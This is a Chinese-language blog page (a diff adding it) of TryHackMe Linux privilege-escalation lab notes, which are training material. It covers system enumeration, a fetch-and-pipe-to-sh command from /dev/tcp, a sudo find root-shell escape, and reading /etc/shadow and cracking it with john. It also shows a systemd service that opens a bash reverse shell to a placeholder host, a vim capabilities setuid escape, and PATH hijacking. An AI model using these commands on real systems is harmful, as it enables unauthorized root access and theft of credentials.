@@ -1,0 +1,708 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="GroundCtl2MajorTom">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Linux前提：已取得低权用户shell 关键元素：目标系统的具体配置、内核版本、安装的应用程序、支持的编程语言、其他用户的密码 Enumeration12    hostname&#x2F;&#x2F;可以提供有关目标系统在企业网络中的角色的信息（例如，生产 SQL 服务器的 SQL-PROD-01）  12uname -a将打印系统信息，为我们提供有关系统使用的内核的其他详细信息。在搜索可能导致权限提升的任何潜在">
+<meta property="og:type" content="article">
+<meta property="og:title" content="tryhackme_linux_提权">
+<meta property="og:url" content="http://groundctl2majortom.github.io/2023/08/08/tryhackme-linux-%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="GroundCtl2MajorTom">
+<meta property="og:description" content="Linux前提：已取得低权用户shell 关键元素：目标系统的具体配置、内核版本、安装的应用程序、支持的编程语言、其他用户的密码 Enumeration12    hostname&#x2F;&#x2F;可以提供有关目标系统在企业网络中的角色的信息（例如，生产 SQL 服务器的 SQL-PROD-01）  12uname -a将打印系统信息，为我们提供有关系统使用的内核的其他详细信息。在搜索可能导致权限提升的任何潜在">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/-%E6%8F%90%E6%9D%83/image-20231016012836758.png">
+<meta property="article:published_time" content="2023-08-08T10:57:18.000Z">
+<meta property="article:modified_time" content="2024-09-07T11:02:38.305Z">
+<meta property="article:author" content="GroundCtl2MajorTom">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/-%E6%8F%90%E6%9D%83/image-20231016012836758.png">
+  
+  
+  
+  <title>tryhackme_linux_提权 - GroundCtl2MajorTom</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"groundctl2majortom.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>GroundCtl2majorTom</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="tryhackme_linux_提权"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-08 18:57" pubdate>
+          2023年8月8日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          17 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">tryhackme_linux_提权</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>前提：已取得低权用户shell</p>
+<p>关键元素：目标系统的具体配置、内核版本、安装的应用程序、支持的编程语言、其他用户的密码</p>
+<h5 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">    hostname<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>可以提供有关目标系统在企业网络中的角色的信息（例如，生产 <span class="hljs-keyword">SQL</span> 服务器的 <span class="hljs-keyword">SQL</span><span class="hljs-operator">-</span>PROD<span class="hljs-number">-01</span>）<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -a<br>将打印系统信息，为我们提供有关系统使用的内核的其他详细信息。在搜索可能导致权限提升的任何潜在内核漏洞时，这将非常有用。<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby">cat /<span class="hljs-built_in">proc</span>/version<br><span class="hljs-built_in">proc</span> 文件系统 （procfs） 提供有关目标系统进程的信息。你会发现许多不同的<span class="hljs-title class_">Linux</span>风格的<span class="hljs-built_in">proc</span>，使其成为你武器库中必不可少的工具。<br>可能会为您提供有关内核版本和其他数据的信息，例如是否安装了编译器（例如 <span class="hljs-variable constant_">GCC</span>）<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/issue<br>是一个用于显示操作系统登录提示信息的文件，通常在用户登录时显示。它的内容可以包含系统信息、欢迎词或其他与登录相关的信息。<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">ps -<span class="hljs-selector-tag">A</span>：这个命令将显示所有正在执行的进程，不区分终端会话。它将列出每个进程的进程ID（PID）和进程名。<br>ps axjf：这个命令将显示更详细的进程信息，包括进程树结构和父子关系。<span class="hljs-selector-tag">a</span> 参数表示显示所有用户的进程，<span class="hljs-attribute">x</span> 参数表示显示没有控制终端的进程，j 参数用于显示进程树状结构。<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">env</span><br>输出将包括所有可用环境变量和它们的值。这些值可能包括系统路径、语言设置、用户密码和其他敏感信息<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br>列出当前用户可使用 <span class="hljs-built_in">sudo</span> 命令执行的所有命令及其相关的执行权限。这些权限通常由系统管理员设置。<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">id<br><span class="hljs-attribute">uid</span>=1001(karen) <span class="hljs-attribute">gid</span>=1001(karen) <span class="hljs-attribute">groups</span>=1001(karen)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd|grep home<br>返回所有用户，其中一些是系统或服务用户不是很有用,此命令可以返回拥有他们的home目录下的文件夹的用户信息<br><span class="hljs-built_in">cat</span> /etc/passwd|<span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot;:&quot;</span> -f 1<br>剪切并转换为暴力攻击的有用列表<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ifconfig</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">ip route <span class="hljs-comment">//查看路由</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">netstat</span> -s：按协议列出网络使用情况统计信息<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">netstat <span class="hljs-punctuation">-</span>i：显示接口统计信息。 <span class="hljs-comment">//每个网卡的流量统计 重点看RX-OK参数</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> . -name flag1.txt：.txt在 当前目录<br><span class="hljs-built_in">find</span> /home -name flag1.txt：在 中找到文件名“flag1.txt” /home 目录<br><span class="hljs-built_in">find</span> / -type d -name config：在“/”下找到名为<span class="hljs-built_in"> config </span>的目录<br><span class="hljs-built_in">find</span> / -type f -perm 0777：查找具有 777 权限的文件 （所有用户可读、可写和可执行的文件）<br><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">a</span>=x：查找可执行文件<br><span class="hljs-built_in">find</span> /home -user frank：在用户“Frank”下查找用户“Frank”的所有文件 “/家”<br><span class="hljs-built_in">find</span> / -mtime 10：查找最近 10 个修改的文件 日<br><span class="hljs-built_in">find</span> / -atime 10：查找最近 10 个中访问过的文件 日<br><span class="hljs-built_in">find</span> / -cmin -60：查找过去一小时内更改的文件 （60 分钟）<br><span class="hljs-built_in">find</span> / -amin -60：查找过去一小时内访问的文件 （60 分钟）<br><span class="hljs-built_in">find</span> / -size 50M：查找大小为 50 MB 的文件<br><br><span class="hljs-built_in">find</span> / -writable -type d 2&gt;/dev/<span class="hljs-literal">null</span> : <span class="hljs-built_in">Find</span> world-writeable folders<br><span class="hljs-built_in">find</span> / -perm -222 -type d 2&gt;/dev/<span class="hljs-literal">null</span>: <span class="hljs-built_in">Find</span> world-writeable folders<br><span class="hljs-built_in">find</span> / -perm -o w -type d 2&gt;/dev/<span class="hljs-literal">null</span>: <span class="hljs-built_in">Find</span> world-writeable folders<br><span class="hljs-built_in">find</span> / -perm -o x -type d 2&gt;/dev/<span class="hljs-literal">null</span> : <span class="hljs-built_in">Find</span> world-executable folders<br><br><span class="hljs-built_in">Find</span> development tools <span class="hljs-keyword">and</span> supported languages:<br><span class="hljs-built_in">find</span> / -name perl*<br><span class="hljs-built_in">find</span> / -name python*<br><span class="hljs-built_in">find</span> / -name gcc*<br><br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gams">find / -perm -u=s -type f <span class="hljs-number">2</span>&gt;/dev/null  <br><span class="hljs-comment">//查找具有 SUID 的文件，这允许我们以更高的权限级别运行文件 比当前用户。</span><br>SUID （<span class="hljs-keyword">Set</span> User <span class="hljs-comment">ID</span>）是文件权限中的一种特殊标志。如果应用于可执行文件，则当普通用户执行该文件时，该文件将以拥有者或指定用户（或组）的特权运行。这意味着该文件将使用与其所有者相同的权限，而不是用户自己的权限。<br>要设置 SUID 标志，可以使用 <span class="hljs-comment">chmod</span> 命令：<br>chmod <span class="hljs-comment">+s filename</span><br>此命令将为文件 filename 设置 <span class="hljs-comment">SUID</span> 标志。使用相反的符号 <span class="hljs-comment">-s</span> 可以删除 <span class="hljs-comment">SUID</span> 标志。<br>SUID 标志常用于需要系统管理员权限才能执行的程序。例如，<span class="hljs-comment">passwd</span> 命令必须以 <span class="hljs-comment">root</span> 用户的权限运行才能更改密码。因此，<span class="hljs-comment">passwd</span> 可以设置为具有 <span class="hljs-comment">SUID</span> 标志的可执行文件，以使普通用户也能够更改自己的密码。<br></code></pre></td></tr></table></figure>
+
+<h6 id="自动化枚举工具"><a href="#自动化枚举工具" class="headerlink" title="自动化枚举工具"></a>自动化枚举工具</h6><p><a target="_blank" rel="noopener" href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a>  sh</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p>
+<p>本地下载好.sh文件 开python3</p>
+<p>目标机 cd到tmp目录下wget</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">或者<br><span class="hljs-built_in">sudo</span> nc -q 5 -lvnp 80 &lt; xxx.sh <span class="hljs-comment">#Host</span><br><span class="hljs-built_in">cat</span> &lt; /dev/tcp/<span class="hljs-variable">$hostip</span>/80 | sh <span class="hljs-comment">#Victim</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h5 id="Privilege-Escalation-Kernel-Exploits"><a href="#Privilege-Escalation-Kernel-Exploits" class="headerlink" title="Privilege Escalation: Kernel Exploits"></a>Privilege Escalation: Kernel Exploits</h5><p>pwnkit    <a target="_blank" rel="noopener" href="https://www.cnblogs.com/vpandaxjl/p/15858288.html">https://www.cnblogs.com/vpandaxjl/p/15858288.html</a></p>
+<p>dirtypipe    <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45996361/article/details/123379361">https://blog.csdn.net/weixin_45996361/article/details/123379361</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.linuxkernelcves.com/cves">https://www.linuxkernelcves.com/cves</a>   Linux Kernel CVEs </p>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/37292">https://www.exploit-db.com/exploits/37292</a>   exploit-db</p>
+<p>通过内核版本查到对应的cve，在db中查到exp</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">注意：.c后缀的<span class="hljs-built_in">exp</span> 使用<br>gcc --<span class="hljs-keyword">static</span> <span class="hljs-built_in">exp</span>.c -o <span class="hljs-built_in">exp</span><br>使用静态链接方式构建您的可执行文件，以便将所需的 GLIBC 版本打包进去。防止使用时缺失版本库<br></code></pre></td></tr></table></figure>
+
+<p>然后host python3      然后victem：cd &#x2F;tmp、wget 、chmod、.&#x2F;exp 提权</p>
+<h5 id="Privilege-Escalation-Sudo"><a href="#Privilege-Escalation-Sudo" class="headerlink" title="Privilege Escalation: Sudo"></a>Privilege Escalation: Sudo</h5><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sudo -l<br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> karen on ip<span class="hljs-number">-10</span><span class="hljs-number">-10</span><span class="hljs-number">-188</span><span class="hljs-number">-138</span>:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span><br><br><span class="hljs-title class_">User</span> karen may run the following commands on ip<span class="hljs-number">-10</span><span class="hljs-number">-10</span><span class="hljs-number">-188</span><span class="hljs-number">-138</span>:<br>    (<span class="hljs-title class_">ALL</span>) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/find<br>    (<span class="hljs-title class_">ALL</span>) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/less<br>    (<span class="hljs-title class_">ALL</span>) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/nano<br></code></pre></td></tr></table></figure>
+
+<p>到这个网站上搜索提权命令</p>
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/find/">https://gtfobins.github.io/gtfobins/find/</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">sudo</span> find . -<span class="hljs-built_in">exec</span> /bin/sh \; -quit</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">whoami</span></span><br>root<br></code></pre></td></tr></table></figure>
+
+<h5 id="Privilege-Escalation-SUID"><a href="#Privilege-Escalation-SUID" class="headerlink" title="Privilege Escalation: SUID"></a>Privilege Escalation: SUID</h5><p>cat &#x2F;etc&#x2F;passwd—&gt;拖回本地<strong>passwd.txt</strong></p>
+<p>&#x2F;&#x2F;查找具有SUID和SGID  的文件，他们执行时暂时具有root权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>//find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null 有什么区别？<br></code></pre></td></tr></table></figure>
+
+<p>&#x2F;&#x2F;<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io</a> 找到一个对应的base64,可以读取任意文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">LFILE=/etc/shadow<br><span class="hljs-built_in">base64</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LFILE</span>&quot;</span> | <span class="hljs-built_in">base64</span> --decode<br></code></pre></td></tr></table></figure>
+
+<p>本地复制出来一个shadow.txt，然后</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">unshadow passwd<span class="hljs-selector-class">.txt</span> shadow<span class="hljs-selector-class">.txt</span> &gt; out.txt<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crystal">john --wordlist=<span class="hljs-regexp">/usr/share</span><span class="hljs-regexp">/wordlists/rockyou</span>.txt <span class="hljs-keyword">out</span>.txt<br>Password1        (karen)     <br>Password1        (user2)     <br>test123          (gerryconway)    <br></code></pre></td></tr></table></figure>
+
+<p>&#x2F;&#x2F;该方法可以解出以上两个其他普通用户的密码，无法root，但是还是可以读取任意文件，读取到了root用户的flag3.txt</p>
+<p>op—suid systemctl 提权</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">写一个服务，这个服务一启动就弹shell<br><span class="hljs-keyword">echo</span> &#x27;[Service]<br>Type=oneshot<br>ExecStart=<span class="hljs-string">/bin/bash</span> -c <span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/x.x.x.x/xxx 0&gt;&amp;1 2&lt;&amp;1&quot;</span><br>[Install]<br>WantedBy=multi-user.target&#x27; &gt; mm.service<br><br><span class="hljs-string">///</span>当mm.service在tmp目录下时，无法被systemctl加载。这里需要掌握一个神奇的目录：<span class="hljs-string">/dev/shm/</span><br>cp mm.service <span class="hljs-string">/dev/shm/</span>       <br><span class="hljs-string">//</span>攻击机起监听<br>systemctl link <span class="hljs-string">/dev/shm/mm.service</span><br>systemctl enable <span class="hljs-params">--now</span> <span class="hljs-string">/dev/shm/mm.service</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h5 id="Privilege-Escalation-Capabilities"><a href="#Privilege-Escalation-Capabilities" class="headerlink" title="Privilege Escalation: Capabilities"></a>Privilege Escalation: Capabilities</h5><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">getcap -r / <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/#+capabilities">https://gtfobins.github.io/#+capabilities</a> 查到对应vim利用</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs maxima">cp $(which <span class="hljs-built_in">view</span>) .<br>sudo setcap cap_setuid+ep <span class="hljs-built_in">view</span><br>./<span class="hljs-built_in">view</span> -c &#x27;:py import os; os.setuid(<span class="hljs-number">0</span>); os.execl(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;reset; exec sh&quot;</span>)&#x27;<br>//以上是原话行不通，修改两个地方（一个<span class="hljs-built_in">view</span>路径，一个py3） 只执行下面这一句话   <span class="hljs-built_in">view</span>有root权限<br>/home/ubuntu/<span class="hljs-built_in">view</span> -c &#x27;:py3 import os; os.setuid(<span class="hljs-number">0</span>); os.execl(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;reset; exec sh&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure>
+
+<h5 id="Privilege-Escalation-Cron-Jobs"><a href="#Privilege-Escalation-Cron-Jobs" class="headerlink" title="Privilege Escalation: Cron Jobs"></a>Privilege Escalation: Cron Jobs</h5><h5 id="Privilege-Escalation-PATH"><a href="#Privilege-Escalation-PATH" class="headerlink" title="Privilege Escalation: PATH"></a>Privilege Escalation: PATH</h5><p><code>PATH</code> 变量是一个包含一组目录路径的环境变量，用于指示系统在哪里查找可执行文件。</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/-%E6%8F%90%E6%9D%83/image-20231016012836758.png" srcset="/img/loading.gif" lazyload alt="image-20231016012836758"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure>
+
+<p>每个路径由冒号分隔。当您在终端中输入一个命令时，系统会按照 <code>PATH</code> 变量中的路径顺序依次检查这些目录，直到找到对应的可执行文件或搜索完所有路径。</p>
+<p>&#x2F;&#x2F;这个漏洞赌的是<code>find / -writable 2&gt;/dev/null | cut -d &quot;/&quot; -f 2,3 | grep -v proc | sort -u</code>的时候能不能找到<strong>不属于系统本身</strong>的可执行文件，系统管理员之前 <code>chmod u+s xxx </code>过，具有suid权限。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_49340699/article/details/118801756">https://blog.csdn.net/weixin_49340699/article/details/118801756</a></p>
